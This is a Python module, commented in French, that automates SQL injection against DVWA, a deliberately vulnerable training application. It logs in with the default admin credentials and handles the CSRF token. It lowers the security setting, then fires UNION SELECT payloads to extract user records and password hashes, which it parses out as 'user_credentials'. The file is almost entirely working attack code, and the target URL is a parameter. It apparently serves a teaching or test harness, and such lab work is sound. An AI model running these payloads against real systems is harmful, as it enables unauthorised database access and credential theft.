"""
SQL Injection Attack Module - VERSION FINALE CORRIGÉE
Avec gestion CSRF token + parsing correct du format DVWA
"""
import time
import requests
from datetime import datetime
import re
from bs4 import BeautifulSoup


class SQLInjectionAttack:
    def __init__(self, target, parameters):
        self.target = target
        self.parameters = parameters
        self.intensity = parameters.get('intensity', 'medium')
        self.payloads = parameters.get('payloads', [])
        self.aborted = False
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
        })
        self.dvwa_authenticated = False
        self.results = {
            'vulnerabilities_found': [],
            'data_extracted': [],
            'success': False,
            'attempts': 0
        }
        
        if not self.payloads:
            self.payloads = [
                "1' OR '1'='1",
                "1' OR 1=1#",
                "1' UNION SELECT user, password FROM users#",
                "1' UNION SELECT first_name, last_name FROM users#",
                "1' UNION SELECT user_id, CONCAT(first_name,' ',last_name) FROM users#",
            ]
    
    def execute(self):
        """Execute SQL injection attack"""
        yield {
            'message': '🚀 Démarrage SQL Injection (VERSION FINALE)',
            'progress': 0,
            'status': 'initializing',
            'packets_sent': 0
        }
        
        # AUTH avec CSRF
        auth_success = self._authenticate_dvwa_with_csrf()
        if auth_success:
            yield {
                'message': '🔓 Session DVWA OK avec CSRF',
                'progress': 10,
                'status': 'authenticated'
            }
        else:
            yield {
                'message': '⚠️ Auth échouée - tentative quand même',
                'progress': 10,
                'status': 'warning'
            }
        
        time.sleep(0.5)
        
        total_payloads = len(self.payloads)
        attempts = 0
        
        for i, payload in enumerate(self.payloads):
            if self.aborted:
                yield {'message': 'Attaque interrompue', 'status': 'aborted'}
                break
            
            attempts += 1
            self.results['attempts'] = attempts
            
            yield {
                'message': f'💉 Test: {payload[:40]}',
                'progress': 10 + int((i + 1) / total_payloads * 70),
                'status': 'testing',
                'payload': payload,
                'packets_sent': attempts
            }
            
            try:
                # URL
                if '?' in self.target:
                    inject_url = f"{self.target}&id={requests.utils.quote(payload)}&Submit=Submit"
                else:
                    inject_url = f"{self.target}?id={requests.utils.quote(payload)}&Submit=Submit"
                
                # Requête
                response = self.session.get(inject_url, timeout=5)
                
                print(f"\n{'='*80}")
                print(f"🔍 PAYLOAD: {payload}")
                print(f"Status: {response.status_code}, Longueur: {len(response.text)}")
                
                # Parser
                soup = BeautifulSoup(response.text, 'html.parser')
                visible_text = soup.get_text()
                
                # Compteurs
                id_count = visible_text.count('ID:')
                first_name_count = visible_text.count('First name:')
                surname_count = visible_text.count('Surname:')
                
                print(f"📊 ID: {id_count}, First name: {first_name_count}, Surname: {surname_count}")
                
                # Vulnérabilité si plusieurs résultats
                vulnerability_found = False
                extracted_data = []
                
                if id_count > 1 or first_name_count > 1:
                    vulnerability_found = True
                    print(f"✅ VULNÉRABILITÉ!")
                    
                    # PARSING CORRIGÉ pour format: "ID: 1First name: adminSurname: admin"
                    # Les données sont COLLÉES sans espaces/retours à la ligne
                    
                    # Méthode 1: Regex pour capturer le format collé
                    pattern = r'ID:\s*(\d+)\s*First name:\s*([^\s]+)\s*Surname:\s*([^\s]+)'
                    matches = re.findall(pattern, visible_text, re.IGNORECASE)
                    
                    for match in matches:
                        user_id, first_name, surname = match
                        # Filtrer les labels
                        if first_name.lower() not in ['first', 'name', 'firstname']:
                            record = {
                                'id': user_id.strip(),
                                'first_name': first_name.strip(),
                                'surname': surname.strip()
                            }
                            extracted_data.append(record)
                            print(f"  📝 Extrait: ID={user_id}, Nom={first_name} {surname}")
                    
                    # Méthode 2: Si regex échoue, parser plus agressivement
                    if not extracted_data:
                        # Split par "ID:" puis parser chaque bloc
                        blocks = visible_text.split('ID:')[1:]  # Skip le premier bloc vide
                        
                        for block in blocks:
                            # Extraire ID
                            id_match = re.match(r'\s*(\d+)', block)
                            if not id_match:
                                continue
                            user_id = id_match.group(1)
                            
                            # Extraire First name
                            fname_match = re.search(r'First name:\s*([^\s\n]+)', block, re.IGNORECASE)
                            if not fname_match:
                                continue
                            first_name = fname_match.group(1)
                            
                            # Extraire Surname
                            sname_match = re.search(r'Surname:\s*([^\s\n]+)', block, re.IGNORECASE)
                            if not sname_match:
                                continue
                            surname = sname_match.group(1)
                            
                            # Filtrer labels
                            if first_name.lower() not in ['first', 'name', 'firstname', 'surname']:
                                record = {
                                    'id': user_id.strip(),
                                    'first_name': first_name.strip(),
                                    'surname': surname.strip()
                                }
                                extracted_data.append(record)
                                print(f"  📝 Extrait (méthode 2): {record}")
                
                # UNION SELECT avec format différent
                elif 'union' in payload.lower() and len(response.text) > 3000:
                    vulnerability_found = True
                    print(f"✅ UNION SELECT (format alternatif)")
                    
                    # Chercher patterns user/password
                    if 'password' in payload.lower():
                        # Format: user | hash
                        lines = visible_text.split('\n')
                        for line in lines:
                            # Chercher lignes avec hash MD5 (32 chars hexa)
                            if re.search(r'[a-f0-9]{32}', line, re.IGNORECASE):
                                parts = re.split(r'\s+', line.strip())
                                if len(parts) >= 2:
                                    extracted_data.append({
                                        'user': parts[0],
                                        'password_hash': parts[1]
                                    })
                                    print(f"  📝 User/Hash: {parts[0]} | {parts[1][:16]}...")
                
                # Enregistrer résultats
                if vulnerability_found:
                    vuln = {
                        'type': 'SQL Injection',
                        'payload': payload,
                        'parameter': 'id',
                        'severity': 'Critical',
                        'timestamp': datetime.now().isoformat(),
                        'evidence': f'{len(extracted_data)} enregistrements extraits'
                    }
                    self.results['vulnerabilities_found'].append(vuln)
                    
                    yield {
                        'message': f'🎯 VULNÉRABILITÉ! {len(extracted_data)} enreg.',
                        'progress': 10 + int((i + 1) / total_payloads * 70),
                        'status': 'vulnerability_found',
                        'vulnerability': vuln,
                        'packets_sent': attempts
                    }
                    
                    if extracted_data:
                        data_entry = {
                            'type': 'user_credentials',
                            'data': extracted_data,
                            'timestamp': datetime.now().isoformat(),
                            'source': 'DVWA Database',
                            'payload_used': payload,
                            'records_count': len(extracted_data)
                        }
                        self.results['data_extracted'].append(data_entry)
                        
                        yield {
                            'message': f'📊 {len(extracted_data)} enregistrements extraits de DVWA!',
                            'progress': 10 + int((i + 1) / total_payloads * 70),
                            'status': 'data_extracted',
                            'extracted_data': data_entry,
                            'packets_sent': attempts
                        }
                        
                        time.sleep(0.8)
                else:
                    print(f"❌ Pas de vulnérabilité")
                
            except Exception as e:
                print(f"❌ ERREUR: {e}")
                import traceback
                traceback.print_exc()
            
            time.sleep(0.4)
        
        # Résumé
        self.results['success'] = len(self.results['vulnerabilities_found']) > 0
        total_records = sum([len(d['data']) for d in self.results['data_extracted']])
        
        print(f"\n{'='*80}")
        print(f"📊 RÉSUMÉ:")
        print(f"  Vulnérabilités: {len(self.results['vulnerabilities_found'])}")
        print(f"  Données: {total_records} enregistrements")
        print(f"{'='*80}\n")
        
        yield {
            'message': f'✅ Terminé! {len(self.results["vulnerabilities_found"])} vulnérabilités, {total_records} enreg.',
            'progress': 100,
            'status': 'completed',
            'packets_sent': attempts,
            'vulnerabilities_count': len(self.results['vulnerabilities_found']),
            'data_extracted_count': total_records
        }
    
    def _authenticate_dvwa_with_csrf(self):
        """Authentification DVWA avec gestion du CSRF token"""
        try:
            # Extraire base URL
            if '/vulnerabilities/' in self.target:
                base_url = self.target.split('/vulnerabilities/')[0]
            else:
                import urllib.parse
                parsed = urllib.parse.urlparse(self.target)
                base_url = f"{parsed.scheme}://{parsed.netloc}"
            
            print(f"[AUTH] Base URL: {base_url}")
            
            # 1. GET login page + extraire CSRF token
            response = self.session.get(f"{base_url}/login.php", timeout=5)
            print(f"[AUTH] GET login: {response.status_code}")
            print(f"[AUTH] Cookies: {self.session.cookies.get_dict()}")
            
            # Extraire CSRF token
            soup = BeautifulSoup(response.text, 'html.parser')
            token_input = soup.find('input', {'name': 'user_token'})
            csrf_token = token_input['value'] if token_input else None
            print(f"[AUTH] CSRF token: {csrf_token[:20] if csrf_token else 'Aucun'}...")
            
            # 2. POST login AVEC CSRF token
            login_data = {
                'username': 'admin',
                'password': 'password',
                'Login': 'Login'
            }
            if csrf_token:
                login_data['user_token'] = csrf_token
            
            response = self.session.post(f"{base_url}/login.php", 
                                        data=login_data, 
                                        timeout=5, 
                                        allow_redirects=True)
            print(f"[AUTH] POST login: {response.status_code}")
            print(f"[AUTH] URL finale: {response.url}")
            
            # Vérifier connexion
            if 'logout' in response.text.lower():
                print(f"[AUTH] ✅ LOGIN RÉUSSI!")
            else:
                print(f"[AUTH] ⚠️ Login incertain")
                return False
            
            # 3. Set security LOW
            response = self.session.get(f"{base_url}/security.php?security=low&seclev_submit=Submit", timeout=5)
            print(f"[AUTH] Security LOW: {response.status_code}")
            
            # 4. Test accès page SQL
            response = self.session.get(f"{base_url}/vulnerabilities/sqli/", timeout=5)
            print(f"[AUTH] Test SQL page: {response.status_code}, {len(response.text)} chars")
            
            if 'User ID' in response.text or 'Submit' in response.text:
                print(f"[AUTH] ✅ Accès SQL OK!")
                return True
            else:
                print(f"[AUTH] ❌ Pas d'accès SQL")
                return False
            
        except Exception as e:
            print(f"[AUTH] ❌ Erreur: {e}")
            import traceback
            traceback.print_exc()
            return False
    
    def get_results(self):
        return self.results
    
    def abort(self):
        self.aborted = True